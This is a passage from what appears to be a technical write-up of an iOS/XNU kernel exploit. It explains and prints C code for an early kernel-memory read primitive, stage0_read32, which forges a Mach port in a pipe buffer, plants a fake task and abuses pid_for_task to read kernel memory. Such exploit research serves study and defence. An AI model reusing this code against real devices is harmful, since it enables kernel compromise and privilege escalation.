&lt;p&gt;We can find the address of the base port pointer since its at a fixed offset from the &lt;strong&gt;ip_requests&lt;/strong&gt; field. Next, we need to find out the address of the base port from the base port pointer using which we can locate our pipe buffer address. However, as discussed a bit earlier, in order to create a proper fake port on which you can use &lt;strong&gt;task_for_pid()&lt;/strong&gt; on, you must have a &lt;strong&gt;kobject&lt;/strong&gt; field pointing to an address that corresponds to a task. Also, the task will have a &lt;strong&gt;bsd_info&lt;/strong&gt; pointing to a proc. This is achieved by creating a fake port of type &lt;strong&gt;IKOT_NONE&lt;/strong&gt;, creating a fake task and setting the &lt;strong&gt;bsd_info&lt;/strong&gt; field pointing to the (&lt;strong&gt;AddressToRead - OFFSET(pidInProcStruct)&lt;/strong&gt;), and then sending that fask task in a mach message to the fake port. By looking at the port’s &lt;strong&gt;ip_messages.imq_messages&lt;/strong&gt; field via the pipe we can get the address of the &lt;strong&gt;ipc_kmsg&lt;/strong&gt; struct containing the task address, and then replace the port to an &lt;strong&gt;IKOT_TASK&lt;/strong&gt; port with the &lt;strong&gt;kobject&lt;/strong&gt; field pointing tot the fake task. Now that we have built an initial read primitive, we can then use the function &lt;strong&gt;stage0_read64&lt;/strong&gt; to read the &lt;strong&gt;base_port&lt;/strong&gt; address.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// 19\. Now that we know the address of an array that contains a pointer to base_port, we&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// need a way to read data from that address so we can locate our pipe buffer in memory.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// We'll use the traditional pid_for_task() technique to read 4 bytes of kernel memory.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// However, in order for this technique to work, we need to get a fake task containing an&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// offset pointer to the address we want to read at a known location in memory. We can do&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// that by initializing our fake port, sending a Mach message containing our fake task to&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// the port, and reading out the port's imq_messages field.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// An unfortunate consequence of this technique is that each 4-byte read leaks an ipc_kmsg&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// allocation. Thus, we'll store the leaked kmsgs so that we can deallocate them later.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked_kmsgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address_of_base_port_pointer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_requests&lt;/span&gt;
    		&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipr_soright&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;base_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage0_read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address_of_base_port_pointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaked_kmsgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;base port is at 0x%016llx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_port_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Check that it has the offset that we expect.&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;base_port at wrong offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The &lt;strong&gt;stage0_read&lt;/strong&gt; is a really handy function and basically does the job of reading out the kernel memory 32 bits at a time. It basically does the following steps.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Create a fake port in the pipe, set all the required properties and set the &lt;strong&gt;IKOT&lt;/strong&gt; type as &lt;strong&gt;IKOT_NONE&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Create a fake task, set the &lt;strong&gt;bsd_info&lt;/strong&gt; field depending on the address you want to read and send it to the port in a mach message.&lt;/li&gt;
  &lt;li&gt;Read the receiver port contents by reading the pipe and finds the address of the task from its &lt;strong&gt;imq_messages&lt;/strong&gt; field.&lt;/li&gt;
  &lt;li&gt;Rewrite the port by rewriting the pipe and now set the &lt;strong&gt;IKOT&lt;/strong&gt; type as &lt;strong&gt;IKOT_TASK&lt;/strong&gt; to create it as a fake task port so one can use the &lt;strong&gt;task_for_pid()&lt;/strong&gt; call on it&lt;/li&gt;
  &lt;li&gt;Call &lt;strong&gt;pid_for_task&lt;/strong&gt; to read kernel memory&lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stage0_read32&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;Read&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;our&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;Note&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;that&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;very&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;primitive&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;we&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;before&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;we&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;know&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Each&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leaks&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;an&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;We&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ll&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;want&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;primitive&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;our&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffers&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;quickly&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;possible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;This&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routine&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;performs&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;full&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;transfers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;starting&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
     &lt;span class=&quot;err&quot;&gt;*/&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;stage0_read32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Do a read to make the pipe available for a write.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;read_pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Initialize the port as a regular Mach port that's empty and has room for 1 message.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipe_buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;      &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io_makebits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOT_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitq_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_port_waitq_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imq_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imq_msgcount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imq_qlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;write_pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// We'll pretend that the 32-bit value we want to read is the p_pid field of a proc struct.&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Then, we'll get a pointer to that fake proc at a known address in kernel memory by&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// sending the pointer to the fake proc in a Mach message to the fake port.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_proc_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset_from_kmsg_to_fake_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;stage0_send_fake_task_message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_proc_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset_from_kmsg_to_fake_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Read back the port contents to get the address of the ipc_kmsg containing our fake proc&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// pointer.&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;read_pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imq_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Now rewrite the port as a fake task port pointing to our fake task.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset_from_kmsg_to_fake_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io_makebits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOT_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_TASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;FIELD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;write_pipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;c1&quot;&gt;// Now use pid_for_task() to read our value.&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid_for_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s returned %d: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pid_for_task&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;could not read kernel memory in stage %d using %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pid_for_task&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
